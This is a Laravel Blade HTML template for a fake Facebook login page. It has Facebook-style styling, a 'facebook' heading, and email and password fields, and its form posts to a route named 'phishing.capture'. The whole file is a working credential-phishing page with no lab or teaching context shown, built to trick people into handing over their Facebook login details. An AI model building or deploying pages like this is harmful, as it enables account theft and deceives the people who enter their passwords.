<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Facebook Login</title>
        <style>
            body{
                font-family: Arial, sans-serif;
                background: #f0f2f5;
                text-align: center;
            }
            .container{
                background: white;
                width: 300px;
                margin: 100px auto;
                padding: 20px;
                border-radius: 5px;
                box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            }




            input{
                width: 100%;
                padding: 10px;
                margin: 10px 0;
                border: 1px solid #ddd;
                border-radius: 5px;
            }
            button{
                width: 100%;
                padding: 10px;
                margin: 10px 0;
                border: 1px solid #ddd;
                border-radius: 5px;
                background: #1877f2;
                color: white;
                cursor: pointer;
            }
            button:hover{
                background: #1877f2;
                color: white;
                cursor: pointer;
            }
        </style>


    </head>
    <body>
        <div class="container">
            <h1>facebook</h1>
            <form action="{{ route('phishing.capture') }}" method="post">
                @csrf
                <input type="text" name="email" placeholder="Email">
                <input type="password" name="password" placeholder="Password">
                <button type="submit">Login</button>
            </form>
        </div>
    </body>
</html>